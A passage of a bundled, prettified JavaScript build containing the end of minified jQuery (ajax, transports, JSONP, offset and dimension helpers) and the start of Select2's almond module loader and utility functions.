                                (a = i.split(" "))[1] === o &&
                                (s = c[l + " " + a[0]] || c["* " + a[0]])
                              ) {
                                !0 === s
                                  ? (s = c[i])
                                  : !0 !== c[i] &&
                                    ((o = a[0]), u.unshift(a[1]));
                                break;
                              }
                          if (!0 !== s)
                            if (s && e.throws) t = s(t);
                            else
                              try {
                                t = s(t);
                              } catch (e) {
                                return {
                                  state: "parsererror",
                                  error: s
                                    ? e
                                    : "No conversion from " + l + " to " + o,
                                };
                              }
                        }
                    return { state: "success", data: t };
                  })(h, x, T, c)),
                  c
                    ? (h.ifModified &&
                        ((w = T.getResponseHeader("Last-Modified")) &&
                          (de.lastModified[o] = w),
                        (w = T.getResponseHeader("etag")) && (de.etag[o] = w)),
                      204 === t || "HEAD" === h.type
                        ? (_ = "nocontent")
                        : 304 === t
                        ? (_ = "notmodified")
                        : ((_ = x.state), (p = x.data), (c = !(f = x.error))))
                    : ((f = _), (!t && _) || ((_ = "error"), t < 0 && (t = 0))),
                  (T.status = t),
                  (T.statusText = (n || _) + ""),
                  c ? v.resolveWith(g, [p, _, T]) : v.rejectWith(g, [T, _, f]),
                  T.statusCode(b),
                  (b = void 0),
                  d &&
                    m.trigger(c ? "ajaxSuccess" : "ajaxError", [
                      T,
                      h,
                      c ? p : f,
                    ]),
                  y.fireWith(g, [T, _]),
                  d &&
                    (m.trigger("ajaxComplete", [T, h]),
                    --de.active || de.event.trigger("ajaxStop")));
              };
              "object" == typeof t && ((n = t), (t = void 0)), (n = n || {});
              var i,
                o,
                s,
                a,
                l,
                c,
                u,
                d,
                p,
                f,
                h = de.ajaxSetup({}, n),
                g = h.context || h,
                m = h.context && (g.nodeType || g.jquery) ? de(g) : de.event,
                v = de.Deferred(),
                y = de.Callbacks("once memory"),
                b = h.statusCode || {},
                x = {},
                w = {},
                _ = "canceled",
                T = {
                  readyState: 0,
                  getResponseHeader: function (e) {
                    var t;
                    if (u) {
                      if (!a)
                        for (a = {}; (t = Rt.exec(s)); )
                          a[t[1].toLowerCase() + " "] = (
                            a[t[1].toLowerCase() + " "] || []
                          ).concat(t[2]);
                      t = a[e.toLowerCase() + " "];
                    }
                    return null == t ? null : t.join(", ");
                  },
                  getAllResponseHeaders: function () {
                    return u ? s : null;
                  },
                  setRequestHeader: function (e, t) {
                    return (
                      null == u &&
                        ((e = w[e.toLowerCase()] = w[e.toLowerCase()] || e),
                        (x[e] = t)),
                      this
                    );
                  },
                  overrideMimeType: function (e) {
                    return null == u && (h.mimeType = e), this;
                  },
                  statusCode: function (e) {
                    var t;
                    if (e)
                      if (u) T.always(e[T.status]);
                      else for (t in e) b[t] = [b[t], e[t]];
                    return this;
                  },
                  abort: function (e) {
                    var t = e || _;
                    return i && i.abort(t), r(0, t), this;
                  },
                };
              if (
                (v.promise(T),
                (h.url = ((t || h.url || Et.href) + "").replace(
                  Ut,
                  Et.protocol + "//"
                )),
                (h.type = n.method || n.type || h.method || h.type),
                (h.dataTypes = (h.dataType || "*").toLowerCase().match(we) || [
                  "",
                ]),
                null == h.crossDomain)
              ) {
                c = le.createElement("a");
                try {
                  (c.href = h.url),
                    (c.href = c.href),
                    (h.crossDomain =
                      Bt.protocol + "//" + Bt.host !=
                      c.protocol + "//" + c.host);
                } catch (e) {
                  h.crossDomain = !0;
                }
              }
              if (
                (h.data &&
                  h.processData &&
                  "string" != typeof h.data &&
                  (h.data = de.param(h.data, h.traditional)),
                G(Ft, h, n, T),
                u)
              )
                return T;
              for (p in ((d = de.event && h.global) &&
                0 == de.active++ &&
                de.event.trigger("ajaxStart"),
              (h.type = h.type.toUpperCase()),
              (h.hasContent = !Mt.test(h.type)),
              (o = h.url.replace(Pt, "")),
              h.hasContent
                ? h.data &&
                  h.processData &&
                  0 ===
                    (h.contentType || "").indexOf(
                      "application/x-www-form-urlencoded"
                    ) &&
                  (h.data = h.data.replace(Ht, "+"))
                : ((f = h.url.slice(o.length)),
                  h.data &&
                    (h.processData || "string" == typeof h.data) &&
                    ((o += (kt.test(o) ? "&" : "?") + h.data), delete h.data),
                  !1 === h.cache &&
                    ((o = o.replace(It, "$1")),
                    (f = (kt.test(o) ? "&" : "?") + "_=" + Dt.guid++ + f)),
                  (h.url = o + f)),
              h.ifModified &&
                (de.lastModified[o] &&
                  T.setRequestHeader("If-Modified-Since", de.lastModified[o]),
                de.etag[o] && T.setRequestHeader("If-None-Match", de.etag[o])),
              ((h.data && h.hasContent && !1 !== h.contentType) ||
                n.contentType) &&
                T.setRequestHeader("Content-Type", h.contentType),
              T.setRequestHeader(
                "Accept",
                h.dataTypes[0] && h.accepts[h.dataTypes[0]]
                  ? h.accepts[h.dataTypes[0]] +
                      ("*" !== h.dataTypes[0] ? ", " + zt + "; q=0.01" : "")
                  : h.accepts["*"]
              ),
              h.headers))
                T.setRequestHeader(p, h.headers[p]);
              if (h.beforeSend && (!1 === h.beforeSend.call(g, T, h) || u))
                return T.abort();
              if (
                ((_ = "abort"),
                y.add(h.complete),
                T.done(h.success),
                T.fail(h.error),
                (i = G(Wt, h, n, T)))
              ) {
                if (((T.readyState = 1), d && m.trigger("ajaxSend", [T, h]), u))
                  return T;
                h.async &&
                  h.timeout > 0 &&
                  (l = e.setTimeout(function () {
                    T.abort("timeout");
                  }, h.timeout));
                try {
                  (u = !1), i.send(x, r);
                } catch (e) {
                  if (u) throw e;
                  r(-1, e);
                }
              } else r(-1, "No Transport");
              return T;
            },
            getJSON: function (e, t, n) {
              return de.get(e, t, n, "json");
            },
            getScript: function (e, t) {
              return de.get(e, void 0, t, "script");
            },
          }),
          de.each(["get", "post"], function (e, t) {
            de[t] = function (e, n, r, i) {
              return (
                se(n) && ((i = i || r), (r = n), (n = void 0)),
                de.ajax(
                  de.extend(
                    { url: e, type: t, dataType: i, data: n, success: r },
                    de.isPlainObject(e) && e
                  )
                )
              );
            };
          }),
          de.ajaxPrefilter(function (e) {
            var t;
            for (t in e.headers)
              "content-type" === t.toLowerCase() &&
                (e.contentType = e.headers[t] || "");
          }),
          (de._evalUrl = function (e, t, n) {
            return de.ajax({
              url: e,
              type: "GET",
              dataType: "script",
              cache: !0,
              async: !1,
              global: !1,
              converters: { "text script": function () {} },
              dataFilter: function (e) {
                de.globalEval(e, t, n);
              },
            });
          }),
          de.fn.extend({
            wrapAll: function (e) {
              var t;
              return (
                this[0] &&
                  (se(e) && (e = e.call(this[0])),
                  (t = de(e, this[0].ownerDocument).eq(0).clone(!0)),
                  this[0].parentNode && t.insertBefore(this[0]),
                  t
                    .map(function () {
                      for (var e = this; e.firstElementChild; )
                        e = e.firstElementChild;
                      return e;
                    })
                    .append(this)),
                this
              );
            },
            wrapInner: function (e) {
              return se(e)
                ? this.each(function (t) {
                    de(this).wrapInner(e.call(this, t));
                  })
                : this.each(function () {
                    var t = de(this),
                      n = t.contents();
                    n.length ? n.wrapAll(e) : t.append(e);
                  });
            },
            wrap: function (e) {
              var t = se(e);
              return this.each(function (n) {
                de(this).wrapAll(t ? e.call(this, n) : e);
              });
            },
            unwrap: function (e) {
              return (
                this.parent(e)
                  .not("body")
                  .each(function () {
                    de(this).replaceWith(this.childNodes);
                  }),
                this
              );
            },
          }),
          (de.expr.pseudos.hidden = function (e) {
            return !de.expr.pseudos.visible(e);
          }),
          (de.expr.pseudos.visible = function (e) {
            return !!(
              e.offsetWidth ||
              e.offsetHeight ||
              e.getClientRects().length
            );
          }),
          (de.ajaxSettings.xhr = function () {
            try {
              return new e.XMLHttpRequest();
            } catch (e) {}
          });
        var Gt = { 0: 200, 1223: 204 },
          Yt = de.ajaxSettings.xhr();
        (oe.cors = !!Yt && "withCredentials" in Yt),
          (oe.ajax = Yt = !!Yt),
          de.ajaxTransport(function (t) {
            var n, r;
            if (oe.cors || (Yt && !t.crossDomain))
              return {
                send: function (i, o) {
                  var s,
                    a = t.xhr();
                  if (
                    (a.open(t.type, t.url, t.async, t.username, t.password),
                    t.xhrFields)
                  )
                    for (s in t.xhrFields) a[s] = t.xhrFields[s];
                  for (s in (t.mimeType &&
                    a.overrideMimeType &&
                    a.overrideMimeType(t.mimeType),
                  t.crossDomain ||
                    i["X-Requested-With"] ||
                    (i["X-Requested-With"] = "XMLHttpRequest"),
                  i))
                    a.setRequestHeader(s, i[s]);
                  (n = function (e) {
                    return function () {
                      n &&
                        ((n =
                          r =
                          a.onload =
                          a.onerror =
                          a.onabort =
                          a.ontimeout =
                          a.onreadystatechange =
                            null),
                        "abort" === e
                          ? a.abort()
                          : "error" === e
                          ? "number" != typeof a.status
                            ? o(0, "error")
                            : o(a.status, a.statusText)
                          : o(
                              Gt[a.status] || a.status,
                              a.statusText,
                              "text" !== (a.responseType || "text") ||
                                "string" != typeof a.responseText
                                ? { binary: a.response }
                                : { text: a.responseText },
                              a.getAllResponseHeaders()
                            ));
                    };
                  }),
                    (a.onload = n()),
                    (r = a.onerror = a.ontimeout = n("error")),
                    void 0 !== a.onabort
                      ? (a.onabort = r)
                      : (a.onreadystatechange = function () {
                          4 === a.readyState &&
                            e.setTimeout(function () {
                              n && r();
                            });
                        }),
                    (n = n("abort"));
                  try {
                    a.send((t.hasContent && t.data) || null);
                  } catch (e) {
                    if (n) throw e;
                  }
                },
                abort: function () {
                  n && n();
                },
              };
          }),
          de.ajaxPrefilter(function (e) {
            e.crossDomain && (e.contents.script = !1);
          }),
          de.ajaxSetup({
            accepts: {
              script:
                "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
            },
            contents: { script: /\b(?:java|ecma)script\b/ },
            converters: {
              "text script": function (e) {
                return de.globalEval(e), e;
              },
            },
          }),
          de.ajaxPrefilter("script", function (e) {
            void 0 === e.cache && (e.cache = !1),
              e.crossDomain && (e.type = "GET");
          }),
          de.ajaxTransport("script", function (e) {
            var t, n;
            if (e.crossDomain || e.scriptAttrs)
              return {
                send: function (r, i) {
                  (t = de("<script>")
                    .attr(e.scriptAttrs || {})
                    .prop({ charset: e.scriptCharset, src: e.url })
                    .on(
                      "load error",
                      (n = function (e) {
                        t.remove(),
                          (n = null),
                          e && i("error" === e.type ? 404 : 200, e.type);
                      })
                    )),
                    le.head.appendChild(t[0]);
                },
                abort: function () {
                  n && n();
                },
              };
          });
        var Kt,
          Xt = [],
          Vt = /(=)\?(?=&|$)|\?\?/;
        de.ajaxSetup({
          jsonp: "callback",
          jsonpCallback: function () {
            var e = Xt.pop() || de.expando + "_" + Dt.guid++;
            return (this[e] = !0), e;
          },
        }),
          de.ajaxPrefilter("json jsonp", function (t, n, r) {
            var i,
              o,
              s,
              a =
                !1 !== t.jsonp &&
                (Vt.test(t.url)
                  ? "url"
                  : "string" == typeof t.data &&
                    0 ===
                      (t.contentType || "").indexOf(
                        "application/x-www-form-urlencoded"
                      ) &&
                    Vt.test(t.data) &&
                    "data");
            if (a || "jsonp" === t.dataTypes[0])
              return (
                (i = t.jsonpCallback =
                  se(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback),
                a
                  ? (t[a] = t[a].replace(Vt, "$1" + i))
                  : !1 !== t.jsonp &&
                    (t.url += (kt.test(t.url) ? "&" : "?") + t.jsonp + "=" + i),
                (t.converters["script json"] = function () {
                  return s || de.error(i + " was not called"), s[0];
                }),
                (t.dataTypes[0] = "json"),
                (o = e[i]),
                (e[i] = function () {
                  s = arguments;
                }),
                r.always(function () {
                  void 0 === o ? de(e).removeProp(i) : (e[i] = o),
                    t[i] && ((t.jsonpCallback = n.jsonpCallback), Xt.push(i)),
                    s && se(o) && o(s[0]),
                    (s = o = void 0);
                }),
                "script"
              );
          }),
          (oe.createHTMLDocument =
            (((Kt = le.implementation.createHTMLDocument("").body).innerHTML =
              "<form></form><form></form>"),
            2 === Kt.childNodes.length)),
          (de.parseHTML = function (e, t, n) {
            return "string" != typeof e
              ? []
              : ("boolean" == typeof t && ((n = t), (t = !1)),
                t ||
                  (oe.createHTMLDocument
                    ? (((r = (t =
                        le.implementation.createHTMLDocument("")).createElement(
                        "base"
                      )).href = le.location.href),
                      t.head.appendChild(r))
                    : (t = le)),
                (o = !n && []),
                (i = me.exec(e))
                  ? [t.createElement(i[1])]
                  : ((i = x([e], t, o)),
                    o && o.length && de(o).remove(),
                    de.merge([], i.childNodes)));
            var r, i, o;
          }),
          (de.fn.load = function (e, t, n) {
            var r,
              i,
              o,
              s = this,
              a = e.indexOf(" ");
            return (
              a > -1 && ((r = F(e.slice(a))), (e = e.slice(0, a))),
              se(t)
                ? ((n = t), (t = void 0))
                : t && "object" == typeof t && (i = "POST"),
              s.length > 0 &&
                de
                  .ajax({ url: e, type: i || "GET", dataType: "html", data: t })
                  .done(function (e) {
                    (o = arguments),
                      s.html(
                        r ? de("<div>").append(de.parseHTML(e)).find(r) : e
                      );
                  })
                  .always(
                    n &&
                      function (e, t) {
                        s.each(function () {
                          n.apply(this, o || [e.responseText, t, e]);
                        });
                      }
                  ),
              this
            );
          }),
          (de.expr.pseudos.animated = function (e) {
            return de.grep(de.timers, function (t) {
              return e === t.elem;
            }).length;
          }),
          (de.offset = {
            setOffset: function (e, t, n) {
              var r,
                i,
                o,
                s,
                a,
                l,
                c = de.css(e, "position"),
                u = de(e),
                d = {};
              "static" === c && (e.style.position = "relative"),
                (a = u.offset()),
                (o = de.css(e, "top")),
                (l = de.css(e, "left")),
                ("absolute" === c || "fixed" === c) &&
                (o + l).indexOf("auto") > -1
                  ? ((s = (r = u.position()).top), (i = r.left))
                  : ((s = parseFloat(o) || 0), (i = parseFloat(l) || 0)),
                se(t) && (t = t.call(e, n, de.extend({}, a))),
                null != t.top && (d.top = t.top - a.top + s),
                null != t.left && (d.left = t.left - a.left + i),
                "using" in t ? t.using.call(e, d) : u.css(d);
            },
          }),
          de.fn.extend({
            offset: function (e) {
              if (arguments.length)
                return void 0 === e
                  ? this
                  : this.each(function (t) {
                      de.offset.setOffset(this, e, t);
                    });
              var t,
                n,
                r = this[0];
              return r
                ? r.getClientRects().length
                  ? ((t = r.getBoundingClientRect()),
                    (n = r.ownerDocument.defaultView),
                    {
                      top: t.top + n.pageYOffset,
                      left: t.left + n.pageXOffset,
                    })
                  : { top: 0, left: 0 }
                : void 0;
            },
            position: function () {
              if (this[0]) {
                var e,
                  t,
                  n,
                  r = this[0],
                  i = { top: 0, left: 0 };
                if ("fixed" === de.css(r, "position"))
                  t = r.getBoundingClientRect();
                else {
                  for (
                    t = this.offset(),
                      n = r.ownerDocument,
                      e = r.offsetParent || n.documentElement;
                    e &&
                    (e === n.body || e === n.documentElement) &&
                    "static" === de.css(e, "position");

                  )
                    e = e.parentNode;
                  e &&
                    e !== r &&
                    1 === e.nodeType &&
                    (((i = de(e).offset()).top += de.css(
                      e,
                      "borderTopWidth",
                      !0
                    )),
                    (i.left += de.css(e, "borderLeftWidth", !0)));
                }
                return {
                  top: t.top - i.top - de.css(r, "marginTop", !0),
                  left: t.left - i.left - de.css(r, "marginLeft", !0),
                };
              }
            },
            offsetParent: function () {
              return this.map(function () {
                for (
                  var e = this.offsetParent;
                  e && "static" === de.css(e, "position");

                )
                  e = e.offsetParent;
                return e || Pe;
              });
            },
          }),
          de.each(
            { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" },
            function (e, t) {
              var n = "pageYOffset" === t;
              de.fn[e] = function (r) {
                return Ce(
                  this,
                  function (e, r, i) {
                    var o;
                    if (
                      (ae(e)
                        ? (o = e)
                        : 9 === e.nodeType && (o = e.defaultView),
                      void 0 === i)
                    )
                      return o ? o[t] : e[r];
                    o
                      ? o.scrollTo(n ? o.pageXOffset : i, n ? i : o.pageYOffset)
                      : (e[r] = i);
                  },
                  e,
                  r,
                  arguments.length
                );
              };
            }
          ),
          de.each(["top", "left"], function (e, t) {
            de.cssHooks[t] = O(oe.pixelPosition, function (e, n) {
              if (n)
                return (
                  (n = j(e, t)), tt.test(n) ? de(e).position()[t] + "px" : n
                );
            });
          }),
          de.each({ Height: "height", Width: "width" }, function (e, t) {
            de.each(
              { padding: "inner" + e, content: t, "": "outer" + e },
              function (n, r) {
                de.fn[r] = function (i, o) {
                  var s = arguments.length && (n || "boolean" != typeof i),
                    a = n || (!0 === i || !0 === o ? "margin" : "border");
                  return Ce(
                    this,
                    function (t, n, i) {
                      var o;
                      return ae(t)
                        ? 0 === r.indexOf("outer")
                          ? t["inner" + e]
                          : t.document.documentElement["client" + e]
                        : 9 === t.nodeType
                        ? ((o = t.documentElement),
                          Math.max(
                            t.body["scroll" + e],
                            o["scroll" + e],
                            t.body["offset" + e],
                            o["offset" + e],
                            o["client" + e]
                          ))
                        : void 0 === i
                        ? de.css(t, n, a)
                        : de.style(t, n, i, a);
                    },
                    t,
                    s ? i : void 0,
                    s
                  );
                };
              }
            );
          }),
          de.each(
            [
              "ajaxStart",
              "ajaxStop",
              "ajaxComplete",
              "ajaxError",
              "ajaxSuccess",
              "ajaxSend",
            ],
            function (e, t) {
              de.fn[t] = function (e) {
                return this.on(t, e);
              };
            }
          ),
          de.fn.extend({
            bind: function (e, t, n) {
              return this.on(e, null, t, n);
            },
            unbind: function (e, t) {
              return this.off(e, null, t);
            },
            delegate: function (e, t, n, r) {
              return this.on(t, e, n, r);
            },
            undelegate: function (e, t, n) {
              return 1 === arguments.length
                ? this.off(e, "**")
                : this.off(t, e || "**", n);
            },
            hover: function (e, t) {
              return this.mouseenter(e).mouseleave(t || e);
            },
          }),
          de.each(
            "blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(
              " "
            ),
            function (e, t) {
              de.fn[t] = function (e, n) {
                return arguments.length > 0
                  ? this.on(t, null, e, n)
                  : this.trigger(t);
              };
            }
          );
        var Qt = /^[\s\uFEFF\xA0]+|([^\s\uFEFF\xA0])[\s\uFEFF\xA0]+$/g;
        (de.proxy = function (e, t) {
          var n, r, i;
          if (("string" == typeof t && ((n = e[t]), (t = e), (e = n)), se(e)))
            return (
              (r = V.call(arguments, 2)),
              (i = function () {
                return e.apply(t || this, r.concat(V.call(arguments)));
              }),
              (i.guid = e.guid = e.guid || de.guid++),
              i
            );
        }),
          (de.holdReady = function (e) {
            e ? de.readyWait++ : de.ready(!0);
          }),
          (de.isArray = Array.isArray),
          (de.parseJSON = JSON.parse),
          (de.nodeName = s),
          (de.isFunction = se),
          (de.isWindow = ae),
          (de.camelCase = f),
          (de.type = i),
          (de.now = Date.now),
          (de.isNumeric = function (e) {
            var t = de.type(e);
            return (
              ("number" === t || "string" === t) && !isNaN(e - parseFloat(e))
            );
          }),
          (de.trim = function (e) {
            return null == e ? "" : (e + "").replace(Qt, "$1");
          }),
          "function" == typeof define &&
            define.amd &&
            define("jquery", [], function () {
              return de;
            });
        var Zt = e.jQuery,
          Jt = e.$;
        return (
          (de.noConflict = function (t) {
            return (
              e.$ === de && (e.$ = Jt),
              t && e.jQuery === de && (e.jQuery = Zt),
              de
            );
          }),
          void 0 === t && (e.jQuery = e.$ = de),
          de
        );
      });
    }),
    i.register("cK7q3", function (e, t) {
      var n, i;
      function s(e) {
        return e && e.constructor === Symbol ? "symbol" : typeof e;
      }
      (n = e.exports),
        (i = function () {
          return s;
        }),
        Object.defineProperty(n, "default", {
          get: i,
          set: undefined,
          enumerable: !0,
          configurable: !0,
        });
    });
  var o,
    s = i("2B2k2"),
    a = {},
    l = i("cK7q3");
  (o = function (e) {
    var t = (function () {
        if (e && e.fn && e.fn.select2 && e.fn.select2.amd)
          var t = e.fn.select2.amd;
        var n, r, i, o, s, a, c, u, d, p, f, h, g, m, v, y, b, x, w, _, T, A, C;
        return (
          (t && t.requirejs) ||
            (t ? (r = t) : (t = {}),
            (d = function (e, t) {
              return T.call(e, t);
            }),
            (p = function (e, t) {
              var n,
                r,
                i,
                o,
                s,
                a,
                l,
                c,
                u,
                d,
                p,
                f = t && t.split("/"),
                h = w.map,
                g = (h && h["*"]) || {};
              if (e) {
                for (
                  s = (e = e.split("/")).length - 1,
                    w.nodeIdCompat &&
                      C.test(e[s]) &&
                      (e[s] = e[s].replace(C, "")),
                    "." === e[0].charAt(0) &&
                      f &&
                      (e = f.slice(0, f.length - 1).concat(e)),
                    u = 0;
                  u < e.length;
                  u++
                )
                  if ("." === (p = e[u])) e.splice(u, 1), (u -= 1);
                  else if (".." === p) {
                    if (
                      0 === u ||
                      (1 === u && ".." === e[2]) ||
                      ".." === e[u - 1]
                    )
                      continue;
                    u > 0 && (e.splice(u - 1, 2), (u -= 2));
                  }
                e = e.join("/");
              }
              if ((f || g) && h) {
                for (u = (n = e.split("/")).length; u > 0; u -= 1) {
                  if (((r = n.slice(0, u).join("/")), f))
                    for (d = f.length; d > 0; d -= 1)
                      if ((i = h[f.slice(0, d).join("/")]) && (i = i[r])) {
                        (o = i), (a = u);
                        break;
                      }
                  if (o) break;
                  !l && g && g[r] && ((l = g[r]), (c = u));
                }
                !o && l && ((o = l), (a = c)),
                  o && (n.splice(0, a, o), (e = n.join("/")));
              }
              return e;
            }),
            (f = function (e, t) {
              return function () {
                var n = A.call(arguments, 0);
                return (
                  "string" != typeof n[0] && 1 === n.length && n.push(null),
                  a.apply(o, n.concat([e, t]))
                );
              };
            }),
            (h = function (e) {
              return function (t) {
                b[e] = t;
              };
            }),
            (g = function (e) {
              if (d(x, e)) {
                var t = x[e];
                delete x[e], (_[e] = !0), s.apply(o, t);
              }
              if (!d(b, e) && !d(_, e)) throw new Error("No " + e);
              return b[e];
            }),
            (m = function (e) {
              var t,
                n = e ? e.indexOf("!") : -1;
              return (
                n > -1 &&
                  ((t = e.substring(0, n)), (e = e.substring(n + 1, e.length))),
                [t, e]
              );
            }),
            (v = function (e) {
              return e ? m(e) : [];
            }),
            (y = function (e) {
              return function () {
                return (w && w.config && w.config[e]) || {};
              };
            }),
            (b = {}),
            (x = {}),
            (w = {}),
            (_ = {}),
            (T = Object.prototype.hasOwnProperty),
            (A = [].slice),
            (C = /\.js$/),
            (c = function (e, t) {
              var n,
                r,
                i = m(e),
                o = i[0],
                s = t[1];
              return (
                (e = i[1]),
                o && ((o = p(o, s)), (n = g(o))),
                o
                  ? (e =
                      n && n.normalize
                        ? n.normalize(
                            e,
                            ((r = s),
                            function (e) {
                              return p(e, r);
                            })
                          )
                        : p(e, s))
                  : ((e = p(e, s)),
                    (o = (i = m(e))[0]),
                    (e = i[1]),
                    o && (n = g(o))),
                { f: o ? o + "!" + e : e, n: e, pr: o, p: n }
              );
            }),
            (u = {
              require: function (e) {
                return f(e);
              },
              exports: function (e) {
                var t = b[e];
                return void 0 !== t ? t : (b[e] = {});
              },
              module: function (e) {
                return { id: e, uri: "", exports: b[e], config: y(e) };
              },
            }),
            (s = function (e, t, n, r) {
              var i,
                s,
                a,
                p,
                m,
                y,
                w,
                T = [],
                A = void 0 === n ? "undefined" : (0, l.default)(n);
              if (
                ((y = v((r = r || e))), "undefined" === A || "function" === A)
              ) {
                for (
                  t =
                    !t.length && n.length
                      ? ["require", "exports", "module"]
                      : t,
                    m = 0;
                  m < t.length;
                  m += 1
                )
                  if ("require" === (s = (p = c(t[m], y)).f))
                    T[m] = u.require(e);
                  else if ("exports" === s) (T[m] = u.exports(e)), (w = !0);
                  else if ("module" === s) i = T[m] = u.module(e);
                  else if (d(b, s) || d(x, s) || d(_, s)) T[m] = g(s);
                  else {
                    if (!p.p) throw new Error(e + " missing " + s);
                    p.p.load(p.n, f(r, !0), h(s), {}), (T[m] = b[s]);
                  }
                (a = n ? n.apply(b[e], T) : void 0),
                  e &&
                    (i && i.exports !== o && i.exports !== b[e]
                      ? (b[e] = i.exports)
                      : (a === o && w) || (b[e] = a));
              } else e && (b[e] = n);
            }),
            (n =
              r =
              a =
                function (e, t, n, r, i) {
                  if ("string" == typeof e)
                    return u[e] ? u[e](t) : g(c(e, v(t)).f);
                  if (!e.splice) {
                    if (((w = e).deps && a(w.deps, w.callback), !t)) return;
                    t.splice ? ((e = t), (t = n), (n = null)) : (e = o);
                  }
                  return (
                    (t = t || function () {}),
                    "function" == typeof n && ((n = r), (r = i)),
                    r
                      ? s(o, e, t, n)
                      : setTimeout(function () {
                          s(o, e, t, n);
                        }, 4),
                    a
                  );
                }),
            (a.config = function (e) {
              return a(e);
            }),
            (n._defined = b),
            ((i = function (e, t, n) {
              if ("string" != typeof e)
                throw new Error(
                  "See almond README: incorrect module build, no module name"
                );
              t.splice || ((n = t), (t = [])),
                d(b, e) || d(x, e) || (x[e] = [e, t, n]);
            }).amd = { jQuery: !0 }),
            (t.requirejs = n),
            (t.require = r),
            (t.define = i)),
          t.define("almond", function () {}),
          t.define("jquery", [], function () {
            var t = e || $;
            return (
              null == t &&
                console &&
                console.error &&
                console.error(
                  "Select2: An instance of jQuery or a jQuery-compatible library was not found. Make sure that you are including jQuery before Select2 on your web page."
                ),
              t
            );
          }),
          t.define("select2/utils", ["jquery"], function (e) {
            var t = function (e) {
                var t = e.prototype,
                  n = [];
                for (var r in t)
                  "function" == typeof t[r] && "constructor" !== r && n.push(r);
                return n;
              },
              n = {
                Extend: function (e, t) {
                  var n = function () {
                      this.constructor = e;
                    },
                    r = {}.hasOwnProperty;
                  for (var i in t) r.call(t, i) && (e[i] = t[i]);
                  return (
                    (n.prototype = t.prototype),
                    (e.prototype = new n()),
                    (e.__super__ = t.prototype),
                    e
                  );
                },
                Decorate: function (e, n) {
                  var r = function () {
                      var t = Array.prototype.unshift,
                        r = n.prototype.constructor.length,
                        i = e.prototype.constructor;
                      r > 0 &&
                        (t.call(arguments, e.prototype.constructor),
                        (i = n.prototype.constructor)),
                        i.apply(this, arguments);
                    },
                    i = t(n),
                    o = t(e);
                  (n.displayName = e.displayName),
                    (r.prototype = new (function () {
                      this.constructor = r;
                    })());
                  for (var s = 0; s < o.length; s++) {
                    var a = o[s];
                    r.prototype[a] = e.prototype[a];
                  }
                  for (
                    var l = function (e) {
                        var t = function () {};
                        (e in r.prototype) && (t = r.prototype[e]);
                        var i = n.prototype[e];
                        return function () {
                          return (
                            Array.prototype.unshift.call(arguments, t),
                            i.apply(this, arguments)
                          );
                        };
                      },
                      c = 0;
                    c < i.length;
                    c++
                  ) {
                    var u = i[c];
                    r.prototype[u] = l(u);
                  }
                  return r;
                },
              },
              r = function () {
                this.listeners = {};
              };
            (r.prototype.on = function (e, t) {
              (this.listeners = this.listeners || {}),
                e in this.listeners
                  ? this.listeners[e].push(t)
                  : (this.listeners[e] = [t]);
            }),
              (r.prototype.trigger = function (e) {
                var t = Array.prototype.slice,
                  n = t.call(arguments, 1);
                (this.listeners = this.listeners || {}),
                  null == n && (n = []),
                  0 === n.length && n.push({}),
                  (n[0]._type = e),
                  e in this.listeners &&
                    this.invoke(this.listeners[e], t.call(arguments, 1)),
                  "*" in this.listeners &&
                    this.invoke(this.listeners["*"], arguments);
              }),
              (r.prototype.invoke = function (e, t) {
                for (var n = 0, r = e.length; n < r; n++) e[n].apply(this, t);
              }),
              (n.Observable = r),
              (n.generateChars = function (e) {
                for (var t = "", n = 0; n < e; n++)
                  t += Math.floor(36 * Math.random()).toString(36);
                return t;
              }),
              (n.bind = function (e, t) {
                return function () {
                  e.apply(t, arguments);
                };
              }),
              (n._convertData = function (e) {
                for (var t in e) {
                  var n = t.split("-"),
                    r = e;
                  if (1 !== n.length) {
                    for (var i = 0; i < n.length; i++) {
                      var o = n[i];
                      (o = o.substring(0, 1).toLowerCase() + o.substring(1)) in
                        r || (r[o] = {}),
                        i == n.length - 1 && (r[o] = e[t]),
                        (r = r[o]);
                    }
                    delete e[t];
                  }
                }
                return e;
              }),
              (n.hasScroll = function (t, n) {
                var r = e(n),
                  i = n.style.overflowX,
                  o = n.style.overflowY;
                return (
                  (i !== o || ("hidden" !== o && "visible" !== o)) &&
                  ("scroll" === i ||
                    "scroll" === o ||
                    r.innerHeight() < n.scrollHeight ||
                    r.innerWidth() < n.scrollWidth)
                );
              }),
              (n.escapeMarkup = function (e) {
                var t = {
                  "\\": "&#92;",
                  "&": "&amp;",
                  "<": "&lt;",
                  ">": "&gt;",
                  '"': "&quot;",
                  "'": "&#39;",
                  "/": "&#47;",
                };
                return "string" != typeof e
                  ? e
                  : String(e).replace(/[&<>"'\/\\]/g, function (e) {
                      return t[e];
                    });
              }),
              (n.__cache = {});
            var i = 0;
            return (
              (n.GetUniqueElementId = function (e) {
                var t = e.getAttribute("data-select2-id");
                return (
                  null != t ||
                    ((t = e.id
                      ? "select2-data-" + e.id
                      : "select2-data-" +
                        (++i).toString() +
                        "-" +
                        n.generateChars(4)),
                    e.setAttribute("data-select2-id", t)),
                  t
                );
              }),
              (n.StoreData = function (e, t, r) {
                var i = n.GetUniqueElementId(e);
                n.__cache[i] || (n.__cache[i] = {}), (n.__cache[i][t] = r);
              }),
              (n.GetData = function (t, r) {
                var i = n.GetUniqueElementId(t);
                return r
                  ? n.__cache[i] && null != n.__cache[i][r]
                    ? n.__cache[i][r]
                    : e(t).data(r)
                  : n.__cache[i];
              }),
              (n.RemoveData = function (e) {
                var t = n.GetUniqueElementId(e);
                null != n.__cache[t] && delete n.__cache[t],
                  e.removeAttribute("data-select2-id");
              }),
              (n.copyNonInternalCssClasses = function (e, t) {
                var n = e.getAttribute("class").trim().split(/\s+/);
                n = n.filter(function (e) {
                  return 0 === e.indexOf("select2-");
                });
                var r = t.getAttribute("class").trim().split(/\s+/);
                r = r.filter(function (e) {
                  return 0 !== e.indexOf("select2-");
                });
                var i = n.concat(r);
                e.setAttribute("class", i.join(" "));
              }),
              n
            );
          }),
          t.define("select2/results", ["jquery", "./utils"], function (e, t) {
            function n(e, t, r) {
              (this.$element = e),
                (this.data = r),
                (this.options = t),
                n.__super__.constructor.call(this);
            }
            return (
              t.Extend(n, t.Observable),
              (n.prototype.render = function () {
                var t = e(
